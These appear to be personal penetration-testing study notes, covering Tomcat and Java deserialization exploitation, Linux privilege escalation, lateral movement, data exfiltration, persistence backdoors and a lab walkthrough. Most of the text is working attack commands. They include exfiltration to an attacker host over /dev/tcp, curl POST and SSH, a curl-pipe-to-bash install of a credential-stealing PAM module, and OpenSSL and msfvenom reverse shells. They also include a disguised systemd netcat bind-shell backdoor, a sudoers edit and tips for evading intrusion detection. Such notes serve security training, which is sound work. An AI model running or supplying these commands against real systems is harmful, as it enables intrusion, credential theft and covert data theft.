SRVPORT options are essentially what the module use as a web server that the target will use to download the Java payload from.   For additional IDs or Endpoint Detection Evasion, you may wanto to set SSL to true   the majority of metasploit is detect, hence the SSLCert option which allows you to specify your own custom SSL certificate For the SRVHOST.      [+] General tip In regard to metasploit modules and exploits, where possible, always configure a custom SSL certificate For your listeners, etc. This goes a long way in evading Intrusion Detection Systems. Metasploit has been around a long time, and defenders have heavily analyzed the source code, and have written detection capabilities For most modules in their default configurations.       We can interact with our session   Drop to a shell   upgrade the shell with pty.spawn()      [+] Sometimes the RMI can be found in non-standard ports, and other ports which the service may require For other reasons. That goes For virtually any service    Exploiting Java Deserialization     in general, Deserialization of untrusted data.   Java-based applications Jboss, WebLogic, WebSphere and Jenkins are affected by this class of vulnerability   Serialization itself is a process which allows For applications to convert data into a binary format, which is suitable For saving to disk.   In the case of this example, suitable For that data to be transferred over a network and into an application to be then deserialized and processed by the application as usable data again.   #     This process is vulnerable to the deserialization of untrusted malicious data, which can be supplied by the user, and is ultimately deserialized by an application resulting in code execution without even requiring authentication in most cases.   moreover: https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/   webLogic Serialization Vulnerability  https://web.archive.org/web/20160513025134/http:/www.zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability   Exploiting Apache Tomcat      Used primarily For Java-based web applications.   default credentials = https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown   Typically found on port 8180 TCP   Metasploit  use auxiliary/scanner/http/tomcat_mgr_login set options set STOP_ON_SUCCESS = true run      after enter in the Tomcat Manager with the credentials we got here   there is an area that we can see the deployed applications   Laudanum     https://sourceforge.net/projects/laudanum/   in kali: /usr/share/laudanum/ - /jsp/   the cmd.war application is essentially a java application, which if we can deploy successfully, will allow control of the server, and remote command execution.   War file to deploy &gt; browser &gt; select the cmd.war file        confirm if the application was deployed &gt; applications &gt;  /cmd       if the application deployed correctly, we can browser to it with the following URL:   http://&lt;target ip&gt;/cmd/cmd.jsp   // we can now execute commands on the system from the JSP Shell:  cat /etc/passwd      with the possibility of execute commands in hand, we can get a rev shell etc the sky is the limit    Extra [+] - URL encoding conversion  (space) = + (=) = %3d ( / ) = %2f ( . ) = %2e ( aspas ) = %22 ( - ) = %2d ( : ) = %3a   find / -perm -4000 2&gt;/dev/null \t/usr/bin/nmap \tnmap --interactive \t!sh \t// we have root   dRuby RMI Exploit     typically on port TCP 8787   use exploit/linux/misc/drb_remote_codeexec set options   Post-Exploitation   Goals: \t- Perform additional information gathering and enumeration of any systems  from a local perspective (shell, console, etc.) \t- Elevate our privileges \t- Maintain a foothold \t- Pivot to other systems  \t- Utilize methods to exfiltrate data   Categories: \t- Additional Information Gathering \t- Privilege Escalation \t- Lateral Movement \t- Data Exfiltration \t- Maintaining Access   PrivEesc      System and Network Information   User Information   Privileged Access / Cleartext Credentials   Services   Jobs / Tasks   Installed Software Version Information   System and Network Information      Hostname   Does the hostname reveal anything about the systems function?   Can we leverage that information to gain access to function-related information?   hostname     Kernel Version   Is the kernel vulnerable to any exploits?   uname -a     Operating System   Does our current OS have any known exploitable vulnerabilities?   cat /etc/issue      IP address   ifconfig      Running Processes   ps auxw      Network Routes   Is our currently compromised machine routed to other networks?   Can we use this information to pivot?   route -n      DNS Server   Can we obtain information from the DNS server?   Active Directory Accounts, Zone Transfer, etc   cat /etc/resolv.conf      Arp Cache   Have other machines communicated with another target?   Are the other machines accessible from the target?   arp -a      Current Network Connections   Are there any established connections from our machine to other machines and vice versa?   Are the connections over encrypted or non-encrypted channels?   Can we sniff the traffic of those connections?   netstat -auntp   User Information      Current user permissions   Can our current user access sensitive information/configuration details that belong to other users?   find / -user username      UID and GID Information For all users   How many users on the system?   What groups do users belong to?   Can we modify files belonging to users in other groups?   For user in $(cat /etc/passwd | cut -f1 -d\":\"); do id $user; done      Last logged on users   Whos been on the system?   From what systems?   Can we pivot to those other systems using credentials we might already have?   last -a      Root accounts   How many UID 0 (root) accounts are on the system?   Can we get credentials For any of them?   cat /etc/passwd | cut -f1,3,4 -d\":\" | grep \"0:0\" | cut -f1 -d\":\" | awk '{print $1}'      Service Accounts   Do any of the service accounts (i.e, www-data) have shells defined?   Can we log in as those accounts?   cat /etc/passwd      Home Directories   Do we have access to other users home directories?   Is any of the information contained in those directories useful to us?   ls -als /home/*   Privileged Access / ClearText Credentials      Can the current user execute anything with elevated privileges?   sudo -l     Are there any setuid root (SUID) binaries on the system which may be vulnerable to privilege escalation?   find / -perm -4000 -type f 2&gt;/dev/null      Can we read configuration files that might contain sensitive information, passwords, etc?   grep \"password\" /etc/*.conf 2&gt;/dev/null grep -r password /etc/*.conf 2&gt;/dev/null      Can we read the shadow file? If so, can we crack any of the hashes?   cat /etc/shadow      Can we list or read the contents of the /root directory?   ls -als /root      Can we read other users history files?   find /* -name *.*history* -print 2&gt;/dev/null      Can we write to directories that are configured to server web pages?   touch /var/www/file   Services     Which services are configured on the system and what ports are they opening?   netstat - auntp      Are service configuration files readable or modifiable by our current user?   find /etc/init.d ! -uid 0 -type f 2&gt;/dev/null | xargs ls -la      Can we modify the configuration of a service in such a way that gives us elevated privileges?   Edit Service Configuration File      Do the configuration files contain any information we can use to our advantage? (credentials etc)   cat /etc/mysql/my.conf      Can we stop or start the service as our current user?   service &lt;service name&gt; start/stop      What actions take place as a result of being able to stop and start services?   Jobs/Tasks     What tasks or jobs is the system configured to run and at which times?   cat /etc/crontab ls -als /etc/cron.*      Are there any custom jobs or tasks configured as root that world-writable?   find /etc/cron* -type f -perm -o+w -exec ls -l {} \\;      Can we modify any of the existing tasks at all?   Try and modify cron jobs   Installed Software Version Information     What software packages are installed on the system?   dpkg -l      What versions? Are the versions installed out-of-date and vulnerable to existing available exploits?   dpkg -l searchsploit \"httpd 2.2\"      Does any of the installed software allow us to modify their configuration files and could this result in gaining privileged access to the system?   Try and modify package configurations   Tools     Much of the information can be gathered through the user of automated tools   LinEnum = https://github.com/rebootuser/LinEnum   Extra Resources  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://www.rebootuser.com/?p=1623   Netcat File Transfer     if wget isnt available or the connectivity to the internet is restricted   on target: nc -lp 1234 &gt; LinEnum.sh on kali:     nc -w 3 &lt;target ip&gt; 1234 &lt; LinEnum.sh      all traffic is unencrypted and may be detected by Intrusion Detection Systems    Run LinEnum  chmod +x LinEnum.sh ./LinEnum.sh -h   Cleartext credentials in configuration files     Find dotfiles files with history in their names (bash_history)   find /* -name *.*history* -print 2&gt;/dev/null      Grep the apache access.log file For user and pass strings   cat /var/log/apache/access.log | grep -E \"^user|^pass\"      Dump cleartext Pre-Shared Wireless Keys from Network Manager   cat /etc/NetworkManager/system-connections/* | grep -E \"^id|^psk\"   Command Executions Via User-Defined Functions (UDF) \thttps://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html   Metasploit - get config files          Another way to download configuration files from the target system (assuming we have a shell from metasploit session)  → use post/linux/gather/enum_configs            Another metasploit module  → use post/linux/gather/enum_system          There is a lot more in &gt;  /post/linux/    SUID Binaries     There are several other well-known SUID root binaries, as they all require some sort of elevated permissions to perform a function, and some of the most common you will find on linux systems are:   /bin/su /bin/mount /usr/bin/sudo /usr/bin/passwd /usr/bin/chsh   Find SUID Binaries  find / -perm -4000 -type -f 2&gt;/dev/null   SUID Nmap –interactive Mode:     Older versions of Nmap contained an interactive shell, which could be launched via the –interactive switch   Once in interactive mode, and assuming the Nmap executable was SUID root, simply running !sh in the interactive Nmap console would land the user a root shell.   glib ‘$ORIGIN’ Expansion Privilege Escalation:  metasploit: \tuse exploit/linux/local/glibc_origin_expansion_priv_esc moreover: http://seclists.org/fulldisclosure/2010/Oct/257   Modify the /etc/sudoers file  bob ALL=(root) NOPASSWD: /bin/less /var/log/* bob ALL=(root) NOPASSWD: /bin/less /usr/bin/man      First lets examine the less program itself:   if we take a look at its man entry, we can see that as part of its functionality, it allows a user to execute shell commands (shell escape) with the ! Shell-Command:   this allows users to execute commands from inside less.   this will lead to !sh, inside any logs/* directories      Vi/Vim editors also allows breaking out into a shell via the !sh method or executing any shell commands For that matter.    List of common executables  less (!sh) more (!sh) VI/VIM (:!sh) Nmap (--interactive + !sh) ftp (!sh) gdb python Perl lrb lua   Man - Arbitrary Command Execution via Pager Argument  -P = pager  // we can use the -P argument, to run a command that we want. man -P \"id\" man  // if the man is allowed to execute via sudo, we can see the content of the /etc/shadow sudo man -P \"cat /etc/shadow\" man   Docker Sudo Privilege Escalation     docker must be installed in the victim machine   must be defined as an entry For a user in the /etc/sudoers file // this vuln exploits Docker by compiling shellcode For a root shell within a container, sets the SUID attribute on the resulting exploit binary, and then launches a root shell. // moreover = https://github.com/pyperanger/dockerevil   Restricted Shells     chroot jail = its a way to isolate users and users processes from the rest of the operating system   rbash shell - its a common implementation of a restricted shell      rbash when combined with a chroot jail, can be rather effective; however, many times, administrators rely on rbash alone, which opens up several ways we can break out of the restricted shell.    Some of the commands that are usually restricted are:  change directories = cd specifying absolute path names or files containing a (/) or (-) Setting or unsetting the PATH environment variable Using ENV or BASH_ENV For setting ot unsetting other environment variables Using bash output redirection operators ( '&gt;', '&gt;&gt;', '&gt;|', '&lt;&gt;', '&gt;&amp;', '&amp;&gt;') Disabling restricted mode using the \"set+r\" or \"set+o restricted\" commands   How to identify that you are in a Restricted Shell     if you try to run a common cd to change directory, and a restricted error appears   or you are trying to redirect the ouput of a command to a file, and the error appears.   we can confirm by running the command ENV, specifically the $PATH and $SHELL environment variables   How to break the restricted shells          we can try to use an escape command, like !sh if that binaries are allowed to run            with VI/VIM:   open a file and then !sh            with find:       find /home/bob -name test -exec /bin/sh \\;       this will only work if the fil test exist in that path. if it does not, search For a known file, or create a file if needed.       with python, Pearl, IRB etc   python -c 'import pty; pty.spawn(\"/bin/sh\")' pearl -e 'exec \"/bin/sh\";'      with SSH:   we can try to break the shell remotely from another system, by trying to execute a shell with SSH before the restricted shell is initialized on the target:   ssh restricted_user@targetserver -t \"/bin/sh\"   moreover = https://pentestmonkey.net/blog/rbash-scp   Cracking the Shadow  /etc/passwd /etc/shadow - are directly manipulated by the /usr/bin/passwd - In current version of Linux, the hashes in the shadow file are stored as **SHA-512**, and can be recognized by the **$6$** at the beginning of the hash. - Older version may be using SHA-256 or MD5 which can be identified by **$5$** and **$1$** respectively - MD5 ($1$) - will be easiest to crack - SHA-256 ($5$) and SHA-512 ($6$) - may be a bit more difficult - In all cases, if the passwordis weak, we can likely crack it regardless of the hashing algorithm.   John The Ripper     copy the passwd and shadow file to kali   unshadow passwd shadow &gt; toJohn john toJohn --wordlist=/usr/share/wordlists/rockyou.txt   MimiPenguin     if cracking the root or other users password is out of the realm of possibility due to hash strength or any other reason. We can try to obtain from the machines memory using MimiPenguin   https://github.com/huntergregal/mimipenguin   just like mimikatz from windows   Attempts to dumo cleartext credentials from memory from the following applications:   GDM password (kali, debian)   Gnome keyring (ubuntu, archlinux)   VSFTPd (Active FTP connections)   Apache2 (Active HTTP Basic Auth Sessions)   OpenSSH (Active SSH Sessions - Sudo Usage)   There is the sh and py versions   ./mimipenguin.sh  python ./mimipenguin.py   Pilfering Credentials From Swap Memory  swapon -s cat /proc/swaps      We can use the strings command against the partitions.   strings /dev/sda5 | grep \"password=\" string /dev/sda5 | grep \"&amp;password=\"   swap_digger, which can automate searching For common sensitive strings within the swap file: \thttps://github.com/sevagas/swap_digger   Code Execution via Shared Object Library Loading     Hijacking Dynamically Linked Shared Object libraries is another method we can use to obtain elevated privileges to a Linux System under certain conditions.   Similar to Microsoft Windows Dynamic-Link library (DLL), its the linux Equivalent   Providing application with functions that are called from outside of an application by referencing .so files at an applications runtime.   Two primary types of shared objects libraries  1 - Static Libraries (.a) - Code that is compiled into an application 2 - Dynamically Linked Shared Object libraries (.so) - These can either be linked to the application at runtime or loaded or unloaded and linked during an applications execution. // moreover - http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html // we will focus in the second one.   When a Linux application is executed, if it uses Shared Objects, is that it will search for those:     Any directories specified by -rpath-link options (RPATH)   Any directories specified by -rpath options (RPATH)   if the -rpath and -rpath-link options are not used, it will then search the contents of the environment variabled LD_RUN_PATH and LD_LIBRARY_PATH   Directories defined in the DT_RUNPATH environment variable first, if that does not exist, then the DT_RPATH   Then, the default lib directories, normally /lib and /usr/lib   Finally, any directories defined in the /etc/ld.so.conf file      reference - https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html   Determine     Determine the shared objects that are being loaded by an executable   Determine if the application was compiled with RPATH or RUNPATH options. If yes, can we write into the locations specified by the either of those options?   Determine the Shared Object Libraries Being loaded by an Executable   ldd /usr/local/bin/program   // what we are looking here, is to see if we can hijack any of the Shared Objects the executable is linking once we have determined if the executable was compiled with RPATH or RUNPATH options. // if so, we will be able to drop our payload in the directories defined by either of those options. // For that we can use:   objdump -x /usr/local/bin/program | grep RPATH objdump -x /usr/local/bin/program | grep RUNPATH      if it was compiled with the RPATH or RUNPATH options, the objdump output will be similar to:   RPATH /tmp/program/libs RUNPATH /tmp/program/libs      so if we know that the program executable was compiled with RPATH options pointing to /tmp/program/libs, we also know that RPATH is checked For linked Shared Objects before the /lib or /usr/lib directories, we can place our malicious .so file in the /tmp/program/libs directory, and it should be executed whenever the executable is launched.    Generate Backdoored Shared Object  msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=&lt;kali ip&gt; LPORT=&lt;kali port&gt; -f elf-so -o program.so   // with the above msfvenom command, we are creating a .so which is the name of one of the shared objects we know the program loads at runtime and using a stageless shell_reverse_tcp payload pointing to our attacker machine and port, where we will also setup a listener with the same payload.   Send the backdoored Shared Object to the target  python3 -m http.server 80 cd /tmp/program/libs &amp;&amp; http://&lt;kali ip&gt;/program.so   Start a handler  msf:  use exploit/multi/handler set options run      [+] In order to the privesc work, the program must be executed by a user with higher privileges, or scheduled  as part of a cron job that runs as root. etc       or we wait For the program to be launched as a user with elevated privileges or in a luck scenario, the program run as root in the cron job.       we could use social engineering to try and persuade an end-user to execute the program   Alternatively, if we are already root on the system, we can use this method as a stealthy persistence mechanism.   Kernel Exploits  // The kernel is the core of the Linux operating system. // since 1991 has grown to support routers, servers, worsktations, firewalls, mobile such as android, even PlayStation. // Being open source and with thousands of contributors and users, it makes the kernel a high-value target For zero-days or otherwise more popular and known attack vectors. // some recent examples of privesc vulns and associated exploits affecting the Linux kernel:          dirty cow - Existed in Kernel versions since 2.6.22 (2007) and fixed in 2016   https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails            Stack Clash (Multiple Distrivutions/Kernels)   https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash            DCCP Double-Free Privilege Escalation (4.4.0 Kernel / Ubuntu)   https://www.exploit-db.com/exploits/41458/            Race Condition Privilege Escalation (Linux Kernel &lt; 4.10.15)   https://www.exploit-db.com/exploits/43345/       Categories     Buffer Overflows   Memory Corruption   Denial-of-Service   Race Conditions   [+] Advice about exploits          Linux Kernel exploits For our purposes will typically either be pre-compiled ELF binaries, C source code (.c files) which we will compile ourselves, or available via exploits frameworks such as metasploit.       Always take precaution when compiling and executing exploit code. Go the extra mile and try to understand what the exploit is actually doing behind-the-scenes.   Genetally exploits originating from most frameworks, ie metasploit, are ok since many eyes review them, but take extra caution with other exploit sources.   FInding the Right Kernel Exploit  searchsploit:  searchsploit \"linux kernel debian\"   Linux_Exploit_Suggester: \thttps://github.com/InteliSecureLabs/Linux_Exploit_Suggester   perl Linux_Exploit_Suggester.pl -k 2.6.38 -k &lt;version&gt; = kernel version of the target or we can execute directly in the target without the -k switch      Once we have identified several kernel exploits that are valid For our targets kernel version, we can move onto downloading the source code to the target.   Many require parameters that we will need to suply to the exploit command line in onder to get them working.   Compiling Exploit Code     one requirement, is that GNU C/C++ Compiler is installed on the target   we can determine this by running gcc –version on the target system.   gcc exploit.c -o exploit chmod +x exploit ./exploit      if we need to compile to a 32bit architecture and the target does not have gcc, we can compile in our machine and specify the -m32 flag to gcc.   gcc -m32 exploit.c -o exploit   Metasploit Kernel Exploits  use exploit/linux/local/… metasploit has a lot of options   // lets image the scenario when we have a regular shell low privilege user. example:  use exploit/linux/local/udev_netlink set sessions &lt;&gt; run   Kernelpop  https://github.com/spencerdodd/kernelpop      In addition to Metasploit and Searchsploit, we have a relatively new exploit framework designed For Linux and Max targets known as Kernelpop.   Extra resources  https://github.com/SecWiki/linux-kernel-exploits http://exploit-db.com/ https://github.com/lucyoa/kernel-exploits   Unix Socket Exploitation     The easiest to follow example on how to leverage an insufficiently secured Unix socket is Docker.   The docker daemon bind to a unix socket instead of a TCP port.   by default, that Unix Socket is owned by the user root; additionally, the docker always runs as the root user.   // lets suppose that the low priv user has access to the docker command, or he is part of docker group. // and the docker unix socket is not protected by implementing the appropriate permissions.   docker run /etc/shadow:/docker/hashedpasswords -d postgres docker exec -ti {Container ID} bash cat /docker/hashedpasswords &gt; /docker/test.txt chmod 777 /docker/test.txt cat /docker/test.txt   two examples     https://www.exploit-db.com/exploits/40962/   https://github.com/rapid7/metasploit-framework/pull/9408/files   Tools and Resources     LinEnum - https://github.com/rebootuser/LinEnum   LinuxPrivChecker - https://github.com/sleventyeleven/linuxprivchecker   Unix-Privesc-Check - https://github.com/pentestmonkey/unix-privesc-check   Linux Exploit Suggester - https://github.com/InteliSecureLabs/Linux_Exploit_Suggester   Searchsploit - https://www.exploit-db.com/searchsploit/   Kernelpop - https://github.com/spencerdodd/kernelpop   Basic Linux Privesc - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   Linux Post-Exploitation Command list - https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List   Lateral Movement     involves moving throughout the target organization from machine to machine, server to server using credentials we obtain through other phases, and further strengthening our foothold within the target infrastructure to the ultimate objective which is defined by the customer.   SSH HIjacking  https://attack.mitre.org/wiki/Technique/T1184      In order For this method to be successful, the compromised machine should have an active SSH session established to another machine via Public Key Authentication.   if we are root, its possible to compromise the SSH agent or access the SSH agents unix domain socket and hijack the connection.   the ssh-agent creates a unix domain socket, and then listens For connections from the sshd daemon to this socket.   the protection of the socket relies on simple unix permission, that means any authentication keys that are used with that socket can be retrieved by any user who can connect to the socket itself.   moreover = https://www.symantec.com/connect/articles/ssh-and-ssh-agent   how to attack     We first determine the SSH process ID of the user on the compromised host     ps aux | grep sshd           We determine the SSH_AUTH_SOCK environment variable For the sshd PID     grep SSH_AUTH_SOCK /proc/&lt;PID&gt;/environ           Hijack the targets ssh-agent socket     SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add -l           Log into the remote system our victim is logged into as the target     ssh remotesystem -l victim                  https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/           if you have root access and want to discover more credentials     To steal SSH credentials we can use a malicious PAM module  → https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==   Through this malicious PAM module, every SSH connection attempt will be forwarded to a server under your control, accompanied by the credentials used For this connection attempt.   on kali:  git clone https://github.com/mthbernardes/sshLooter cd sshLooter    // host and edit intall.sh and looter.py poiting the url variable to a server under your control, that can log POST request.   on the compromised machine:  curl http://&lt;kali ip&gt;:8000/install.sh | bash   // you can now try the captured credentials against other identified machines in the network!   Samba Secrets to Domain Admin     when a new Samba user is created, this information is usually stored in what is known as the secrets.tdb file   In Samba version 4.7.4 on Debian, the secrets.tdb file is stored in the /var/lib/samba/private directory   if we are root:   tdbdump /var/lib/samba/private/secrets.tdb   // we can see which domain the machine is from // and that one of the data fields contains encoded data that decodes to the NTLM hash           Assuming the Samba server has a valid trust relationship with an Active DIrectory domain, we can decode the results of the tdbdump UTF8 encoded “data” fields to obtain the NTLM hash For the Samba computer account and ultimately pass-the-hash to AD using pth-smbclient       → https://github.com/byt3bl33d3r/pth-toolkit       // going from Samba server to AD as a computer account    → https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9   VPNPivot     creates a VPN tunnel between the attacker and compromised Linux host, and allows pivoting to other hosts internally within an organization that may be behind firewalls, NAT configurations, etc  → https://github.com/0x36/VPNPivot   ./autogen.sh ./configure make &amp;&amp; make install   Dumping Stored Firefox Credentials     Firefox when launched For the first time, creates a default profile For the user   /home/user/.mozilla/firefox and is a folder which is created with a random alphanumeric value and a .default string appended   These saved browser passwords are stored in the randomly named profile folder, in a file called logins.json, and can be dumped using a tool known as firefox_decrypt.py   https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py   We can copy the script and transfer to the target machine   and run:   python firefox_decrypt.py      this tool will only work if the Master Password has not been set.    Data Exfiltration      Some customers will want to include the simulation of an Advanced Persistent Threat (APT)   Once we have been able to obtain sensitive information or reach the objectives of the customer requirements, our goal with data exfiltration is to attempt to move the data we have acquired securely outside of the organization infrastructure to our attacker-controlled systems.   Exfil over TCP Socket with EBCDIC and Base64     Creating a local TCP socket on the target system which points to our attacker machine while we configure a netcat listener to receive the data.   we will tar (archive) the data, encode it with Base64 and EBCDIC (Extended Binary Coded Decimal Interchange Code) encodings and ship the archive to our attacker system over a TCP socket in order to better obfuscate our traffic.   Steps     Netcat handler     nc -lvnp 80 &gt; datafolder.tmp           encode and redirect the data over a local TCP socket     tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic &gt; /dev/tcp/&lt;kali ip&gt;/80           decode the received datafolder.tmp     dd conv=ascii if=datafolder.tmp | base64 -d &gt; datafolder.tar           Extract our tar archive     tar xf datafolder.tar           Exfil over SSH     tar the contents and send to the output over SSH     tar zcf - /tmp/datafolder | ssh root@&lt;kali ip&gt; \"cd /tmp; tar zxpf -\"           on kali, the data is already untared and in our /tmp/datafolder. We can simply browse to the /tmp/datafolder and view our data.   // For extra stealthiness, we should configure our SSH server on port 80 For instance. // Just in case the customer is monitoring For SSH traffic over the standard port 22.   Exfil via POST Request over HTTPS     we can transfer data over HTTPS/SSL, helping us evade heuristics detection over an encrypted channel.   with this method, we POST base64 encoded data over HTTPS to a PHP-based web server that is under our control. This method assumes you have a webserver that is PHP-enabled, and that you have an SSL certificate installed.      create a PHP file that will write data being received as a POST request     &lt;?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?&gt;           curl to send a POST request consisting of the tared and base64-encoded data from the victims /tmp/datafolder directory. We send that POST request to our attacker-controlled PHP web servers contact.php file over SSL which will write a copy of the base64-encoded tar archive to a /tmp/datafolder.base64 file on our attacker system     curl --data \"(tar zcf - /tmp/datafolder | base64)\" https://&lt;kali ip&gt;/contact.php           decode the data while redirecting the output to a datafolder.tar archive, and extract     cat /tmp/datafolder.base64 | base64 -d &gt; datafolder.tar &amp;&amp; tar xf datafolder.tar           Maintaning Access &amp; Persistence      All of the methods we will cover take advantage of utilities that are already installed on a target Linux machine. The less we need to bring to a machine, the better.   This reduces our footprint on a compromised host and leaves less of a trail.   Reverse Shells     Are connections that are initiated from a compromised host and connect back to an attacker Command and Control (C2) or in simpler scenarios, to a basic listener service.   We need to find new ways to create connections back using lesser-known methods or methods that might not be necessarily expected.   OpenSSL Reverse Shell     OpenSSL client and server-based technique in conjunction with what are known as mkfifo names pipes.   mkfifo named pipe creates a named instance (a file) of a series of piped commands, as a file on the filesystem, which can be referenced and used to redirect (&lt;&gt;) output to and from the named pipe (file).   Understanding the Mkfifo process  mkfifo a_pipe gzip -9 -c &lt; a_pipe &gt; out.gz &amp; cat /etc/passwd &gt; a_pipe gunzip out.gz cat out      create our pipe (a_pipe)   create a gzip process which our pipe will listen For input from, and when input is received, will redirect it to a file called out.gz. We run it as a background process (&amp;)   cat the passwd file and redirect the output to out a_pipe which creates an out.gz file containing out catd content.   extract our out.gz file, and we can see that the out contents contained the results of out cat /etc/passwd command.   back to the OpenSSL Reverse Shell     Generate an SSL certificate key pair For our listener on the attacker machine   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes  // this will create two files key.pem and cert.pem. For our listener.      start our listener using openssl   openssl s_server -quit -key key.pem -cert cert.pem -port 443      on the target, create mkfifo named pipe that will connect back to our attacker (over SSL)   mkfifo /tmp/x; /bin/sh -i &lt; /tmp/x 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;kali ip&gt;:443 &gt; /tmp/x; rm /tmp/x   ICMP Reverse Shell     can be accomplished with a tool known as icmpsh  → https://inquisb.github.io/icmpsh/   its based on a master/slave setup and will initiate reverse shells to an attacker system using ICMP packets.   Reverse Shell Resources [+]  → http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet    → https://highon.coffee/blog/reverse-shell-cheat-sheet/   Staged vs Stageless Payloads  → https://github.com/rapid7/metasploit-framework/issues/7297           Stageless payloads are typically larger in size that the standard staged payloads, the primary reason being that they include the payload within the binary, rather than being pushed to the target system via the handler once a connection is established.       stageless payloads use an _ in their name as can be seen above.   example:   windows/meterpreter/reverse_tcp &gt; staged windows/meterpreter_reverse_tcp &gt; stageless   → moreover: http://buffered.io/posts/staged-vs-stageless-handlers/   Xinetd UDP Portknock Backdoor     The built-in xinetd daemon, which is used to manage network-based services on Linux Systems.   Xinetd listens For incoming requests to ports we can define, and when a specific request is received, we can have it execute a command of our choosing.   We create a xinetd service, that listens on UDP port, which we can send a single packet   Once the packet is received to the port we define, it will initiate a netcat reverse shell back to our attacker system.   We are calling it a UDP port-knock backdoor because once we knock on our UDP port, it gives us an immediate reverse shell.   it will persiste across reboots   Steps     on the target, create a custom xinetd service. run the bash script https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56      make sure to modify the attacker ip and attacker port strings.   the script, when executed, will create a new xinetd service called services-udp. The services-udp custom service will be configured to listen on port 65534 UDP on the target machine.   its also required that netcat is on the target in the usual /bin/ directory. It will copy the nc executable to a file called /bin/services-udp.   We are obscuring netcat as another file in this case.      on kali, start a handler with the same port defined in the xinetd script.     nc -lvnp 4444           We will use a tool called hping3 to send a single UDP packet to port 65534 on the target host, the services-udp netcat binary will be triggered and send us a reverse shell. The hping command we will use is:     hping3 -2 -c 1 &lt;target ip&gt; -p 65534          // https://tools.kali.org/information-gathering/hping3       Systemd Netcat Bind Shell     it will also persist through reboots   Systemd is used to launch services and processes and system startup.   similar to Xinetd backdoor, but this one will create a bind shell, rather than a reverse shell      on the target, copy the /bin/nc to /lib/systemd directory as systemd-service     cp /bin/nc /lib/systemd/systemd-service           on the target, create a file called /lib/systemd/system/systemd.service:     [Unit] Description = Systemd Service After = network.target [Service] ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh [Install] WantedBy = multi-user.target           // the above systemd service config will create a bind shell on port 56825 TCP      enable and start the Systemd Netcat Bind Shell Service:     systemctl enable systemd.service symtemctl start systemd.service           confirm if that port For our custom service is listening on the target:     netstat -auntp | grep 56825           from kali, connect to the port     nc &lt;target ip&gt; 56825                 it will persist on reboots and will be listed as systemd-service if listing processes            Lab 3 - Remote and Post Exploitation   Netblock: 172.16.80.1/24 domain: robotstogo.localdomai   ip: 172.16.80.7   172.16.80.22 172.16.80.24 172.16.80.27 172.16.80.26   Task1   Unauthenticated backdoor     172.16.80.27   Scan the ports  nmap -sS 172.16.80.27 -p-  60666/tcp open unknown   connect to the uncommon port  nc 172.16.80.27 60666 - listening on [any] 60667 = it appears that it has a backdoor in the 60667 port, lets connect  nc 172.16.80.27 60667 // we have user access   get a better shell with python  python -c \"import pty; pty.spawn('/bin/bash')\" export TERM=xterm   check if the user can run any program as root  sudo -l /bin/nano /home/*/*/readme.txt   // it seems that we can run nano with root privileges in that specific folder   // the file does not exist, so lets create it   create the file   cd /home/&lt;user&gt; &amp;&amp; mkdir foo &amp;&amp; cd foo ls -s /etc/shadow readme.txt      this will create a symbolic link to the /etc/shadow file    ls -als   grab the file as root  sudo /bin/nano /home/&lt;user&gt;/foo/readme.txt   // this will open the /etc/shadow file  // now we can grab to decode or pass the hash, whatever  // there is endless possibilities   enum the Samba  enum4linux -a 172.16.80.27   // we discovered here, a lot of users // save these users into a file users.txt // then lets try to log with rockyou.txt For passwords   hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.80.27   // this will take a time, and i dont like to wait too much // the solution says that we can use james user and grab the first 500 entries from rockyou.txt   head -n 500 /usr/share/wordlists/rockyou.txt &gt; top-500.txt hydra -l james -P top-500.txt ssh://172.16.80.27 // 5 minutes later, we have the password [22][ssh] host: 172.16.80.27   login: james   password: 159357   log with SSH and execute sudo -l to see the possibilities  (root) /usr/sbin/tcpdump - we have tcpdump access   // we can search in GTFObins // there is something we can use   →  https://gtfobins.github.io/gtfobins/tcpdump/   from gtdobins   COMMAND='id' TF=$(mktemp) echo \"$COMMAND\" &gt; $TF chmod +x $TF sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root    the solution gave this alternative, both works great   $ cat &gt; /tmp/elevate #!/bin/bash echo \"james ALL=(root) NOPASSWD: ALL\" &gt;&gt; /etc/sudoers  chmod +x /tmp/elevate  sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/elevate -Z root sudo bash    Share enumeration  python3 smbmap.py -H 172.16.80.27   // found the web share with READ/WRITE permissions   Alternatively,  nmap --script smb-enum-shares 172.16.80.27   Access that share  smbclient -N \\\\\\\\172.16.80.27\\\\web -U \"\" ls   // lets upload a perl reverse shell // Kalis location: /usr/share/webshells/perl/perl-reverse-shell.pl // remember to change the ip address of the attacker (kali ip)   put perl-reverse-shell.pl   open a listener  nv -lvnp 1234  open the file in the browser      we have a shell as www-data    172.16.80.22      This scan took so long, that I lost all my will.   anyway, there is a RMI Registry 